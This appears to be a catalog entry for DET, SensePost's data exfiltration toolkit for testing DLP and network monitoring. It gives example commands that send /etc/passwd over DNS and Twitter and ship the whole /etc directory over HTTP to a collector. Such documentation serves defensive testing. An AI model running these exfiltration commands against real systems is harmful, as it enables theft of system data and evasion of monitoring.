---
name: "det"
categories:
  - blackarch-networking
version: "31.417cbce"
homepage: "https://github.com/sensepost/det"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "sensepost/det"
github-stars: 821
github-pushed: "2017-11-03"
github-archived: false
github-issues: 7
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# det

> SensePost's proof-of-concept exfiltration toolkit for testing whether DLP and network monitoring actually catch each exfil technique.

*No corpus evidence — derived from upstream documentation.*

## What it's for

DET (Data Exfiltration Toolkit, by PaulWebSec at SensePost) is a proof of concept for simulating data exfiltration over one or several channels at once — HTTP(S), DNS, ICMP, raw TCP/UDP, SMTP/IMAP (e.g. Gmail), Google Docs, and Twitter direct messages — precisely to test how configured Network Monitoring and DLP solutions react to each technique. It runs as a listener (`-L`) on the collection side and as a client that ships a file or folder through the plugins you pick, with optional AES-256 (the `AES_KEY` in the config) and compression. All channel settings live in a JSON config file (start from the shipped `config-sample.json`). It is explicitly a DLP-testing PoC: the README warns it must never be used to exfiltrate real sensitive data. Python 2 era; the active upstream repository is now PaulSec/DET, with sensepost/det frozen since 2017.

## Typical use cases

### Start the collector server

Listen for every configured exfil channel.

```
det -L -c config.json
```

Outcome: loads all plugins defined in config.json and waits; each channel it accepts is reconstructed on this side. This is the box whose egress the DLP under test is watching.

### Exfiltrate a file over chosen channels

Push a file through specific protocols.

```
det -c config.json -p dns,twitter -f /etc/passwd
```

Outcome: the client reads the file and transmits it simultaneously over the DNS and Twitter plugins; only the named plugins are loaded, so the test exercises exactly those two egress paths.

### Exclude channels from a full run

Use every plugin except known-broken ones.

```
det -c config.json -e gmail,icmp -f report.pdf
```

Outcome: all configured plugins except gmail and icmp are used — handy when one channel is blocked or misconfigured without editing the JSON.

### Ship an entire folder

Test sustained multi-file exfiltration.

```
det -c config.json -d /etc/ -p http
```

Outcome: iterates the directory and pushes each file over the HTTP plugin, exercising the DLP against repeated transfers rather than a single file.
